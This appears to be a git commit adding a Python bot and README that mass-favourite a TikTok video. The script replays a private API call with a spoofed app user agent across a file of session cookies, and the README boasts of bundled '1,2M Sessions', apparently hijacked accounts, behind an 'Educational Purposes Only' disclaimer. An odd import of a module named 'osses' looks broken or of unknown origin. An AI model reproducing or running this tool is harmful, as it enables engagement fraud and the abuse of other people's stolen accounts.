f8776b6dd08989200c897f6e4ad967d59081974a
vimukthi <121391615+whoiams@users.noreply.github.com>
2023-01-19 18:19:51 +0530

    Add files via upload

---
+++ collect.py
@@ -0,0 +1,37 @@
+from concurrent.futures import ThreadPoolExecutor
+from requests           import Session
+from osses              import os
+
+Pool = ThreadPoolExecutor(max_workers=125)
+get  = Session().get
+
+def digg(aweme_id, sessionid):
+    for _ in range(5):
+        try:
+            url = "https://api22-normal-c-useast1a.tiktokv.com/aweme/v1/aweme/collect/?aweme_id={}&action=1&channel=googleplay&device_type=Mi+9T&os_version=11&version_code=247&app_name=musical_ly&device_platform=android&aid=1233&as=a1iosdfgh&cp=androide1".format(aweme_id)
+            
+            headers = {
+                "Host"            : "api22-normal-c-useast1a.tiktokv.com",
+                "Connection"      : "keep-alive",
+                "Cookie"          : "sessionid={}".format(sessionid),
+                "Accept-Encoding" : "gzip",
+                "User-Agent"      : "com.ss.android.ugc.trill/247 (Linux; U; Android 11; en_US; Mi 9T; Build/RQ3A.211001.001; Cronet/58.0.2991.0)"
+            }
+            
+            response = get(url, headers=headers, timeout=1, stream=True)
+
+            if response.text == "":
+                continue
+            
+            return print(response.text)
+        except Exception:
+            continue
+
+aweme_id = input("[>] Video ID: ")
+start    = int(input("[>] Start: "))
+stop     = int(input("[>] Stop: "))
+
+with open("sessions.txt", "r") as file:
+    for line in file.read().splitlines()[start:stop]:
+        Pool.submit(digg, aweme_id, line)
+    Pool.shutdown(wait=True)
---
+++ readme.md
@@ -0,0 +1,13 @@
+# TikTok-Favorite-Bot
+## TikTok Favorite Bot | Easily Get 1M+ Favorites
+
+
+Disclaimer: For Educational Purposes Only.
+
+Tool To Boost Your Favorites
+
+- No Proxies Required
+- Easy To Use
+- Comes With 1,2M Sessions
+- Has RPM (Requests Per Minute) Counter
+- Uses Sockets (Fast)
